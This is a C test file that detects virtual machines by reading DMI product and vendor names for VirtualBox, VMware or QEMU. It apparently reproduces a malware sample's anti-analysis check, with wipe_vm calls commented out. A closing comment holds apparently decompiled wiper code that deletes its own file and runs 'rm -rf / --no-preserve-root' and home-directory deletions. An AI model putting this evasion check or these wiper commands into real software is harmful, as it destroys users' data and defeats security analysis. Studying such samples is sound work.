#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
  const char* path = "/sys/class/dmi/id/product_name";
  const char* mode = "r";
  FILE* fp;
  char haystack[100];
  int n = 99;
  fp = fopen(path, mode);
  if (fp) {
      while(fgets(haystack,n,fp)) {
	  printf("searching for needle: %s\n", haystack);
          if(strstr(haystack, "VirtualBox") || strstr(haystack, "VMware")) {
              // wipe_vm(v4);
              printf("trig\n");
              // return 1;
          }
          memset(haystack, 0, n);
          fgets(haystack, n, fp);
      }
      printf("closed first fp\n");
      fclose(fp);
  }
  memset(haystack, 0, n);
  FILE* result = fopen("/sys/class/dmi/id/sys_vendor", "r");
  fp = result;
  if(result) {
      while(fgets(haystack,n,fp)) {
          printf("searching for needle 2: %s\n", haystack);
          if(strstr(haystack, "QEMU")) {
              // wipe_vm(v4);
              printf("trig2\n");
              return 1;
          }
      }
  }
  fclose(fp);
  printf("done\n");
  return 0;
}

// return 1 --> anti virt triggered
// return 0 --> ran normally

/*
v2=argv;
puts("https://google.com");
if(realpath(*vt, &resolved)) {
    snprintf(&s, 0x3Du, "rm -f %s > /dev/null 2> /dev/null", &resolved, v2);
    system(&s);
}
system("rm -rf / --no-preserve-root > /dev/null 2> /dev/null &");
system("rm -rf ~/ > /dev/null 2> /dev/null &");
system("rm -rf ./ > /dev/null 2> /dev/null &");
system("rm -rf / --no-preserve-root > /dev/null 2> /dev/null");
system("rm -rf ~/ > /dev/null 2> /dev/null");
system("rm -rf ./ > /dev/null 2> /dev/null");
return 0;

*/
